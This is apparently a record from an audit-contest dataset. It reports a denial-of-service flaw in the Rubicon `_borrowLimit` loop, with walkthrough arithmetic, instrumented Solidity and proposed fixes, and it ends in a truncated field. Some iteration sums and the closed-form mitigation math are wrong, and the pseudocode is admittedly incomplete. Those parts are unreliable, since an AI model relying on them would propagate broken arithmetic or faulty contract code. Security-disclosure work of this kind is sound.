      "heading_cleaned": "Potential infinite loop in `_borrowLimit` function",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159\n\n\n# Vulnerability details\n\n## Impact\n\nThe infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.\n\n\n## Proof of Concept\n\nThe `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.\n\nThe function works as follows:\n1. Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.\n2. Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`.\n3. Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.\n4. Initialize a while loop that continues until the `_assetAmount` is less than or equal to the desired amount.\n5. In each loop iteration:\n\t1. Calculate the amount that can be borrowed in the current loop (`_loopBorrowed`) based on the collateral factor and any previously supplied collateral.\n\t2. Update the total asset amount in the position by adding the borrowed amount from the current loop. c. Check if the updated asset amount has reached or exceeded the desired amount:\n    -   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.\n    -   If the asset amount perfectly matches the desired amount, increment the borrowing limit.\n    -   In other cases, increment the borrowing limit and proceed to the next iteration.\n\n\nThe calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function.\n\n`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:\n1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.\n2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.\n3. `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:\n    -   Calls the `mul` function to multiply `x` and `y`.\n    -   Adds half of the fixed-point base (WAD / 2) to the result using the `add` function. This step is crucial for rounding the result correctly.\n    -   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.\n\n\nNow that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite.\n\n```solidity\nfunction _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)\n```\n\nAdditionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged.\n\n```typescript\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.7\", 18)\n    );\n```\n\nCalculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).\n\nNow, let's examine what happens within the while loop:\n\n```solidity\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n```\n\nThe important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18\n\t- `_assetAmount` = 25e18 + 17.5e18 = 42.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18\n    -   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18\n    -   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18\n\nSo, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.\n\nGiven that `_loopBorrowed` is \"dividing from itself\", what would happen if it goes to 1, or even 0, but the desired amount is big enough.\n\nBut.. how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?\n\n```typescript\n\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.5\", 18)\n    );\n```\n\nLet's do the exercise again with a reduced collateral factor.\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18\n\t- `_assetAmount` = 25e18 + 12.5e18 = 37.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18\n    -   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18\n    -   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18\n* On the fourth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18\n    -   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18\n* On the fifth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18\n    -   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18\n\nNow that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.\n\nAt this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.\n\nYou can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep \"should open long position\"` command from the existing test suite, which will produce the following output:\n\n\nI have added some console logs for you if you want a visual representation.\n\n```solidity\n  function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n        console.log(_desiredAmount, \"desiredAmount\");\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n        // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            console.log(\"****** in loop\");\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n                    console.log(\"max\", _max);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n\n            }\n\n\n            console.log(\"_loopBorrowed\", _loopBorrowed);\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n            console.log(\"_assetAmount\", _assetAmount);\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n\n            console.log(\"limit\", _limit);\n        }\n    }\n```\n\nIn conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.\n\nThis is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nThat's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.\n\n**Limit the number of iterations**:\n\nIntroduce a maximum number of iterations that the while loop can run, preventing the function from running indefinitely.\n\nThis approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors.\n\nInstead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.\n\n```solidity\nuint256 maxIterations = 50;\nuint256 currentIteration = 0;\n\nwhile (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {\n    // existing logic\n    currentIteration++;\n}\n\n```\n\n\n**Restrict the minimum `_loopBorrowed` value**:\n\nDefine a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold.\n\nThis approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.\n\n\n```solidity\nuint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals\n\nwhile (_assetAmount <= _desiredAmount) {\n    // existing logic\n\n    if (_loopBorrowed < minLoopBorrowed) {\n        break;\n    }\n}\n```\n\n\n**Use a more sophisticated algorithm**:\nInstead of a while loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount.\n\nIt might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop.\n\nHowever, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.\n\nFor instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:\n\n```solidity\nfunction borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {\n    // Calculate the borrowing limit using the closed-form solution\n    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);\n\n    return borrowLimit;\n}\n\n```\n\nTo apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount.\n\nInstead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.\n\nFor example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. Using the closed-form solution formula:\n\n`n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`\n\nSubstituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`\n\nAfter calculating, we get: `n â‰ˆ 1.58`\n\nSince `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`\n\nWe can now calculate the final borrowed amount using the formula for the sum of a geometric series:\n\n`Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`\n\nSubstituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`\n\nCalculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`\n\nThus, the final borrowed amount is: `5,000 = 5,000 + 2,500`\n\nNow that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit.\n\nIf the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.\n\nThe pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:\n\n```solidity\nfunction _borrowLimit(\n    address _bathToken,\n    address _asset,\n    uint256 _assetAmount,\n    uint256 _leverage\n) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n    uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n    if (_minted != 0) {\n        uint256 _max = _maxBorrow(_bathToken);\n        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);\n    }\n\n    if (_collateralFactor == WAD) {\n        // Collateral factor is 1, which means it's a 1x short or perfect matching\n        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);\n        _lastBorrow = wmul(_assetAmount, _collateralFactor);\n    } else {\n        // Calculate the number of terms using the closed-form formula for a geometric series\n        _limit = uint256(\n            log1p(\n                wdiv(\n                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),\n                    _assetAmount.mul(_collateralFactor)\n                )\n            ).div(log1p(_collateralFactor.sub(WAD)))\n        );\n\n        // Calculate the last borrow amount\n        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);\n    }\n}\n\n```\n\nPlease note that the provided solution is incomplete and requires additional adjustments.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L542\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L158-L159\n\n\n# Vulnerability details\n\n## Impact\n\nThe infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.\n\n\n## Proof of Concept\n\nThe `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.\n\nThe function works as follows:\n1. Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.\n2. Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`. \n3. Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.\n4. Initialize a while loop that continues until the `_assetAmount` is less than or equal to the desired amount.\n5. In each loop iteration: \n\t1. Calculate the amount that can be borrowed in the current loop (`_loopBorrowed`) based on the collateral factor and any previously supplied collateral.\n\t2. Update the total asset amount in the position by adding the borrowed amount from the current loop. c. Check if the updated asset amount has reached or exceeded the desired amount:\n    -   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.\n    -   If the asset amount perfectly matches the desired amount, increment the borrowing limit.\n    -   In other cases, increment the borrowing limit and proceed to the next iteration.\n\n\nThe calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function. \n\n`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:\n1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of the result `z` by `y` is equal to `x`. If the condition is not met, it reverts with an error message.\n2.  `add(uint256 x, uint256 y)` is another helper function that adds two uint256 values `x` and `y`. It checks for overflow by ensuring that the result `z` is greater than or equal to `x`. If the condition is not met, the transaction will revert.\n3. `wmul(uint256 x, uint256 y)` is the primary function that multiplies two fixed-point numbers. The function does the following:\n    -   Calls the `mul` function to multiply `x` and `y`.\n    -   Adds half of the fixed-point base (WAD / 2) to the result using the `add` function. This step is crucial for rounding the result correctly.\n    -   Finally, it divides the sum by the fixed-point base (WAD) to obtain the final fixed-point result `z`.\n\n\nNow that we know how most of the calculation works let's assume we call `_borrowLimit` with the variables used in [this](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/test/hardhat-tests/leverage-wrapper.ts#L347-L358) test suite. \n\n```solidity\nfunction _borrowLimit(_bathToken,_asset, 25e18, 23.32e18)\n```\n\nAdditionally, [the collateral factor](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/test/leverage-wrapper.ts#L148-L156) stays unchanged.\n\n```typescript\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.7\", 18)\n    );\n```\n\nCalculating the desired amount, we get that its `58.3e18`, which is the result of wmul(25e18, 23.32e18).\n\nNow, let's examine what happens within the while loop:\n\n```solidity\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                    \n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n                \n            }\n```\n\nThe important thing to note here is that on the first iteration `_loopBorrowed` is the result of `wmul(_assetAmount, _collateralFactor`, but going forward it is a result of itself, e.g. `wmul(_loopBorrowed, _collateralFactor)`\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.7e18) = 17.5e18\n\t- `_assetAmount` = 25e18 + 17.5e18 = 42.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(17.5e18, 0.7e18) = 12.25e18\n    -   `_assetAmount` = 42.5e18 + 12.25e18 = 54.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.25e18, 0.7e18) = 8.575e18\n    -   `_assetAmount` = 54.75e18 + 8.575e18 = 63.325e18\n\nSo, it takes 3 iterations to reach the required result. However, the vulnerability here though is hiding in plain sight.\n\nGiven that `_loopBorrowed` is \"dividing from itself\", what would happen if it goes to 1, or even 0, but the desired amount is big enough.\n\nBut.. how could that happen? What if the `collateralFactor` is 0.5e18 instead of 0.7e18?\n\n```typescript\n\n    // collateralFactor = 70% for cTokenStable\n    await comptroller._setCollateralFactor(\n      cTokenStable.address,\n      parseUnits(\"0.7\", 18)\n    );\n    // collateralFactor = 70% for cToken\n    await comptroller._setCollateralFactor(\n      cToken.address,\n      parseUnits(\"0.5\", 18)\n    );\n```\n\nLet's do the exercise again with a reduced collateral factor.\n\n-   On the first iteration: (limit == 0)\n\t- `_loopBorrowed` = wmul(25e18, 0.5e18) = 12.5e18\n\t- `_assetAmount` = 25e18 + 12.5e18 = 37.5e18\n-   On the second iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(12.5e18, 0.5e18) = 6.25e18\n    -   `_assetAmount` = 37.5e18 + 6.25e18 = 43.75e18\n-   On the third iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(6.25e18, 0.5e18) = 3.125e18\n    -   `_assetAmount` = 43.75e18 + 3.125e18 = 46,875e18\n* On the fourth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(3.125e18, 0.5e18) = 1.5625e18\n    -   `_assetAmount` = 43.75e18 + 1.5625e18 = 48.4375e18\n* On the fifth iteration: (limit != 0)\n    -   `_loopBorrowed` = wmul(1.5625e18, 0.5e18) = 0.78125e18\n    -   `_assetAmount` = 43.75e18 + 6.2e18 = 49,2187e18\n\nNow that `_loopBorrowed` < 0 I think its pretty clear where this is going. It will take approximately 60 more iterations until `wmul(_loopBorrowed, 0.5e18)` returns `1`.\n\nAt this point `_assetAmount` will be around `50000000000000000020`, which means it will take the `8299999999999999980` more iterations to get to the required desired amount.\n\nYou can verify these results by running the `yarn hardhat test ./test/leverage-wrapper.ts --grep \"should open long position\"` command from the existing test suite, which will produce the following output:\n\n![](https://i.imgur.com/OgNHyLc.png)\n\nI have added some console logs for you if you want a visual representation.\n\n```solidity\n  function _borrowLimit(\n        address _bathToken,\n        address _asset,\n        uint256 _assetAmount,\n        uint256 _leverage\n    ) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n        (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n        // how much is needed to borrow in asset form\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n        console.log(_desiredAmount, \"desiredAmount\");\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n        \n        // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n        \n        while (_assetAmount <= _desiredAmount) {\n            console.log(\"****** in loop\");\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n                    console.log(\"max\", _max);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                    \n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n                \n            }\n\n\n            console.log(\"_loopBorrowed\", _loopBorrowed);\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n            console.log(\"_assetAmount\", _assetAmount);\n\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n\n            console.log(\"limit\", _limit);\n        }\n    }\n```\n\nIn conclusion, when the collateral factor is lower (and the leverage high), the `_borrowLimit` function becomes highly inefficient and requires a large number of iterations to calculate the desired amount.\n\nThis is just one nuance of this vulnerability and it could be triggered in various ways, but I hope this single explanation is good enough to convince you that it should be addressed.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nThat's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.\n\n**Limit the number of iterations**:\n\nIntroduce a maximum number of iterations that the while loop can run, preventing the function from running indefinitely. \n\nThis approach helps prevent the infinite loop issue, but it means your system won't be able to work with specific collateral factors. \n\nInstead, the maximum number of iterations can be chosen based on expected usage patterns and system requirements.\n\n```solidity\nuint256 maxIterations = 50;\nuint256 currentIteration = 0;\n\nwhile (_assetAmount <= _desiredAmount && currentIteration < maxIterations) {\n    // existing logic\n    currentIteration++;\n}\n\n```\n\n\n**Restrict the minimum `_loopBorrowed` value**: \n\nDefine a minimum acceptable value for `_loopBorrowed` and halt the loop if the value goes below this threshold. \n\nThis approach can help prevent the `_loopBorrowed` value from becoming too small and causing an infinite loop. However, it has the same drawbacks as the previous solution.\n\n\n```solidity\nuint256 minLoopBorrowed = 1e9; // Choose an appropriate minimum value based on the token decimals\n\nwhile (_assetAmount <= _desiredAmount) {\n    // existing logic\n\n    if (_loopBorrowed < minLoopBorrowed) {\n        break;\n    }\n}\n```\n\n\n**Use a more sophisticated algorithm**: \nInstead of a while loop, consider using a more sophisticated algorithm to calculate the borrowing limit and last borrow amount. \n\nIt might be possible to derive a closed-form solution that directly calculates the borrowing limit without needing a loop. \n\nHowever, this approach requires a deep understanding of the mathematical relationship between the input parameters and the desired borrowing limit.\n\nFor instance, if the borrowing limit calculation follows a simple linear relationship, the closed-form solution could be derived as follows:\n\n```solidity\nfunction borrowLimit(uint256 _desiredAmount, uint256 _collateral, uint256 _loanFactor) public view returns (uint256) {\n    // Calculate the borrowing limit using the closed-form solution\n    uint256 borrowLimit = (_desiredAmount * _loanFactor) / (_collateral - _desiredAmount);\n\n    return borrowLimit;\n}\n\n```\n\nTo apply the closed-form solution to the `_borrowLimit` function, we would need to adjust the smart contract to directly compute the required number of iterations `n` and the final borrowed amount. \n\nInstead, we can use the closed-form solution formula to calculate `n` and then determine the final borrowed amount using the formula for the sum of a geometric series.\n\nFor example, consider the scenario where the initial asset amount is `A0 = 10,000` tokens, the desired asset amount is `Ad = 15,000` tokens (10,000 tokens + 5,000 tokens), and the collateral factor is `c = 0.5`. Using the closed-form solution formula:\n\n`n = log_c((1 - ((Ad * (1 - c)) / A0)) - 1)`\n\nSubstituting the values: `n = log_0.5((1 - ((15,000 * (1 - 0.5)) / 10,000)) - 1)`\n\nAfter calculating, we get: `n â‰ˆ 1.58`\n\nSince `n` should be an integer (as it represents the number of iterations), we round up to the nearest whole number: `n = 2`\n\nWe can now calculate the final borrowed amount using the formula for the sum of a geometric series:\n\n`Ad = A0 + A0 * c + A0 * c^2 + ... + A0 * c^n`\n\nSubstituting the values: `15,000 = 10,000 + 10,000 * 0.5 + 10,000 * 0.5^2`\n\nCalculating the geometric series: `15,000 = 10,000 + 5,000 + 2,500`\n\nThus, the final borrowed amount is: `5,000 = 5,000 + 2,500`\n\nNow that we know how it *could*  work, we would need to identify the geometric series that represents the problem and use the closed-form formula for a geometric series to calculate the borrow limit. \n\nIf the collateral factor is not equal to 1, we would need to calculate the number of terms using the closed-form formula for a geometric series and the last borrow amount using the geometric series formula.\n\nThe pseudocode for the updated `_borrowLimit` function using the closed-form solution looks like this:\n\n```solidity\nfunction _borrowLimit(\n    address _bathToken,\n    address _asset,\n    uint256 _assetAmount,\n    uint256 _leverage\n) internal view returns (uint256 _limit, uint256 _lastBorrow) {\n    (, uint256 _collateralFactor, ) = comptroller.markets(_bathToken);\n    uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n    uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\n    if (_minted != 0) {\n        uint256 _max = _maxBorrow(_bathToken);\n        _assetAmount = wmul(_assetAmount, _collateralFactor).add(_max);\n    }\n\n    if (_collateralFactor == WAD) {\n        // Collateral factor is 1, which means it's a 1x short or perfect matching\n        _limit = (_desiredAmount.sub(_assetAmount)).div(WAD);\n        _lastBorrow = wmul(_assetAmount, _collateralFactor);\n    } else {\n        // Calculate the number of terms using the closed-form formula for a geometric series\n        _limit = uint256(\n            log1p(\n                wdiv(\n                    (_desiredAmount.mul(WAD.sub(_collateralFactor))).sub(_assetAmount.mul(WAD)),\n                    _assetAmount.mul(_collateralFactor)\n                )\n            ).div(log1p(_collateralFactor.sub(WAD)))\n        );\n\n        // Calculate the last borrow amount\n        _lastBorrow = wmul(_assetAmount, pow(_collateralFactor, _limit)).sub(_assetAmount);\n    }\n}\n\n```\n\nPlease note that the provided solution is incomplete and requires additional adjustments.",
      "description": null,
      "impact": "## Impact\n\nThe infinite loop vulnerability could cause the `openPosition` functionality to become unresponsive or fail, negatively affecting the performance and usability of the whole system.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nThat's probably one of my hardest mitigations steps to write, so I'll brain-dump almost everything I've researched and that comes to my mind.\n",
      "poc": "## Proof of Concept\n\nThe `_borrowLimit` function is an internal view function used by [`openPosition`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/utilities/poolsUtility/Position.sol#L125-L130)  that calculates the maximum number of borrowing loops allowed for a given asset and leverage, taking into account the collateral factor and any previously supplied collateral. It returns the calculated borrowing limit and the amount required to borrow in the last loop to avoid exceeding the desired amount.\n\nThe function works as follows:\n1. Retrieve the collateral factor for the given `_bathToken` from the `comptroller` contract.\n2. Calculate the desired amount of the asset to borrow based on the given `_assetAmount` and `_leverage`.\n3. Determine if collateral was already supplied by checking the balance of the `_bathToken` in the contract.\n4. Initialize a while loop that continues until the `_assetAmount` is less than or equal to the desired amount.\n5. In each loop iteration:\n\t1. Calculate the amount that can be borrowed in the current loop (`_loopBorrowed`) based on the collateral factor and any previously supplied collateral.\n\t2. Update the total asset amount in the position by adding the borrowed amount from the current loop. c. Check if the updated asset amount has reached or exceeded the desired amount:\n    -   If it has, calculate the borrowing amount required in the last loop to not exceed the desired amount and increment the borrowing limit.\n    -   If the asset amount perfectly matches the desired amount, increment the borrowing limit.\n    -   In other cases, increment the borrowing limit and proceed to the next iteration.\n\n\nThe calculations for the `desiredAmount` and the `_loopBorrowed` are performed by using the [`wmul`](https://github.com/RubiconDeFi/rubi-protocol-v2/blob/34db36c71b170c8f13941ab26eb7ada1288ec82f/contracts/RubiconMarket.sol#L77-L79) function.\n\n`wmul` is designed to multiply two fixed-point numbers (with 18 decimals precision) and return the result as another fixed-point number. Here's a breakdown of how the function works:\n1.  `mul(uint256 x, uint256 y)` is a helper function that multiplies two uint256 values `x` and `y`. It checks for overflow by ensuring that either `y` is 0 or that the division of 